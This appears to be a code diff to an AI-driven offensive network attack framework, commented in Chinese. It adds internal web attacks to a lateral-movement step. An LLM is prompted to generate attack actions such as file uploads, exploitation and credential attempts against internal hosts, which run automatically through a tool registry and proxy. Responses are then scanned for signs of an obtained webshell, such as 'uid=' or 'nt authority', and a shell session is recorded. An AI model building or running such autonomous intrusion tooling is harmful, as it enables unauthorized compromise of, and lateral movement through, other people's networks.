@@ -808,7 +808,7 @@ def _analyze_internal_hosts(hosts: List[Dict], state: Dict = None) -> str:
 
 def lateral_move_node(state: Dict) -> Dict:
     """
-    [横向移动节点] AI驱动的横向移动
+    [横向移动节点] AI驱动的横向移动 + Web攻击支持
 
     输入:
         - current_internal_target: 当前目标
@@ -825,6 +825,7 @@ def lateral_move_node(state: Dict) -> Dict:
         2. 选择最佳攻击方法
         3. 选择合适的凭据
         4. 通过代理执行
+        5. [新增] Web攻击支持（文件上传等）
     """
     # 安全获取列表，处理None值
     target = state.get("current_internal_target", "")
@@ -849,6 +850,27 @@ def lateral_move_node(state: Dict) -> Dict:
             "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
         }
 
+    # 获取目标主机信息
+    target_host = next(
+        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
+        {}
+    )
+    ports = target_host.get("ports") or []
+
+    # ========== 新增：检测Web端口，支持Web攻击 ==========
+    web_ports = [80, 443, 8080, 8443, 8888, 3000, 5000, 9000, 8000, 9090]
+    has_web_port = any(
+        p.get("port") in web_ports for p in ports if isinstance(p, dict)
+    )
+
+    if has_web_port:
+        logger.info(f"[LateralMove] 检测到Web端口，执行Web攻击")
+        web_result = _execute_internal_web_attack(state, target, ports, credentials, proxy_info)
+        if web_result.get("success"):
+            return web_result
+        # Web攻击失败，继续尝试传统横向移动
+        logger.info(f"[LateralMove] Web攻击未成功，尝试传统横向移动")
+
     # 优先从CredentialManager获取凭据
     if CREDENTIAL_INTEGRATION_AVAILABLE and not credentials:
         credentials = get_credentials_for_lateral(state, target)
@@ -861,13 +883,6 @@ def lateral_move_node(state: Dict) -> Dict:
             "current_internal_target": target,
             "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
         }
-
-    # 获取目标主机信息
-    target_host = next(
-        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
-        {}
-    )
-    ports = target_host.get("ports") or []
 
     # AI决策横向移动策略
     move_strategy = _ai_decide_lateral_strategy(target, target_host, credentials, state)
@@ -2532,3 +2547,214 @@ def persistence_node(state: Dict) -> Dict:
             logger.info(f"[Persistence] {host}: {result.message}")
 
     return updates
+
+
+# ============================================================
+# 内网Web攻击支持
+# ============================================================
+
+def _execute_internal_web_attack(
+    state: Dict,
+    target: str,
+    ports: List[Dict],
+    credentials: List[Dict],
+    proxy_info: Dict
+) -> Dict:
+    """
+    执行内网Web攻击
+
+    针对内网Web服务进行攻击，支持：
+    - 文件上传攻击
+    - 漏洞利用
+    - 凭据尝试
+
+    Args:
+        state: 当前状态
+        target: 目标IP
+        ports: 目标端口列表
+        credentials: 已获取的凭据
+        proxy_info: 代理信息
+
+    Returns:
+        攻击结果
+    """
+    logger.info(f"[WebAttack] 开始针对 {target} 的Web攻击")
+
+    # 1. 获取Web端口
+    web_ports = []
+    for p in ports:
+        port = p.get("port", 0)
+        if port in [80, 443, 8080, 8443, 8888, 3000, 5000, 9000, 8000, 9090]:
+            web_ports.append(port)
+
+    if not web_ports:
+        return {"success": False, "error": "无Web端口"}
+
+    # 2. 生成Web攻击提示词
+    if PROMPTS_AVAILABLE:
+        from internal_network.prompts import get_internal_web_attack_prompt
+        prompt = get_internal_web_attack_prompt(
+            target_host=target,
+            target_ports=ports,
+            credentials=credentials,
+            attack_context=state.get("web_attack_context"),
+            stage_info=state.get("stage_info"),
+            strategic_context=state.get("strategic_context")
+        )
+    else:
+        prompt = _build_fallback_web_prompt(target, web_ports, credentials)
+
+    # 3. LLM生成攻击动作
+    try:
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.2,
+            json_mode=True,
+            max_tokens=4096
+        )
+
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
+
+        result = json.loads(response.strip())
+        attack_actions = result.get("attack_actions", [])
+
+        if not attack_actions:
+            logger.warning("[WebAttack] LLM未生成有效攻击动作")
+            return {"success": False, "error": "无有效攻击动作"}
+
+        logger.info(f"[WebAttack] 生成 {len(attack_actions)} 个攻击动作")
+
+    except Exception as e:
+        logger.warning(f"[WebAttack] LLM生成失败: {e}")
+        return {"success": False, "error": str(e)}
+
+    # 4. 执行攻击动作
+    attack_results = []
+    for action in attack_actions[:10]:  # 最多执行10个
+        tool = action.get("tool", "")
+        params = action.get("params", {})
+
+        # 构建完整URL
+        if "url" not in params:
+            port = web_ports[0]
+            scheme = "https" if port in [443, 8443] else "http"
+            params["url"] = f"{scheme}://{target}:{port}/"
+
+        logger.info(f"[WebAttack] 执行: {tool} -> {params.get('url', 'N/A')}")
+
+        try:
+            # 使用ToolRegistry执行
+            exec_result = ToolRegistry.execute(tool, params)
+
+            if exec_result:
+                result_data = exec_result if isinstance(exec_result, dict) else {"output": str(exec_result)}
+                attack_results.append({
+                    "tool": tool,
+                    "params": params,
+                    "result": result_data,
+                    "success": result_data.get("success", False) or result_data.get("status_code") in [200, 201, 301, 302]
+                })
+
+                # 检查是否获取了shell
+                output = result_data.get("output", "") or result_data.get("body", "")
+                if _check_webshell_success(output, result_data):
+                    logger.info(f"[WebAttack] 攻击成功！可能获取了WebShell")
+
+                    # 创建会话
+                    session = {
+                        "host": target,
+                        "session_type": "webshell",
+                        "shell_type": "web",
+                        "url": params.get("url", ""),
+                        "os_type": _detect_os_from_output(output)
+                    }
+
+                    return {
+                        "success": True,
+                        "active_sessions": [session],
+                        "attack_results": attack_results,
+                        "execution_steps": state.get("execution_steps", 0) + 1
+                    }
+
+        except Exception as e:
+            logger.warning(f"[WebAttack] 执行失败: {tool} - {e}")
+            attack_results.append({
+                "tool": tool,
+                "params": params,
+                "error": str(e),
+                "success": False
+            })
+
+    # 5. 返回结果
+    if any(r.get("success") for r in attack_results):
+        return {
+            "success": True,
+            "attack_results": attack_results,
+            "execution_steps": state.get("execution_steps", 0) + 1
+        }
+
+    return {
+        "success": False,
+        "attack_results": attack_results,
+        "error": "所有Web攻击尝试均失败"
+    }
+
+
+def _build_fallback_web_prompt(target: str, web_ports: List[int], credentials: List[Dict]) -> str:
+    """构建降级Web攻击提示词"""
+    return f"""
+针对内网Web服务生成攻击动作。
+
+目标: {target}
+Web端口: {web_ports}
+凭据: {len(credentials)} 条
+
+输出JSON格式：
+{{
+  "attack_actions": [
+    {{"tool": "requests", "params": {{"method": "GET", "url": "http://{target}:{web_ports[0]}/"}}, "reasoning": "探测Web服务"}}
+  ]
+}}
+"""
+
+
+def _check_webshell_success(output: str, result: Dict) -> bool:
+    """检查是否成功获取WebShell"""
+    success_indicators = [
+        "uid=", "gid=",  # Linux命令输出
+        "nt authority", "system",  # Windows命令输出
+        "whoami:", "groups=",  # 命令执行结果
+        "total ", "drwx",  # ls -la 输出
+        "Directory of",  # Windows dir输出
+        "<?php", "<?= ",  # PHP代码执行成功
+        "bash-", "sh-",  # Shell提示符
+        "root@", "admin@",  # 用户提示符
+    ]
+
+    output_lower = output.lower()
+    for indicator in success_indicators:
+        if indicator.lower() in output_lower:
+            return True
+
+    # 检查状态码
+    status_code = result.get("status_code", 0)
+    if status_code in [200, 201, 301, 302]:
+        # 如果有输出且长度合理，可能是成功的
+        if len(output) > 50 and "error" not in output_lower:
+            return True
+
+    return False
+
+
+def _detect_os_from_output(output: str) -> str:
+    """从输出中检测操作系统类型"""
+    output_lower = output.lower()
+
+    if any(kw in output_lower for kw in ["windows", "microsoft", "c:\\", "cmd.exe", "powershell"]):
+        return "windows"
+    elif any(kw in output_lower for kw in ["linux", "ubuntu", "centos", "debian", "/bin/", "/home/"]):
+        return "linux"
+
+    return "unknown"
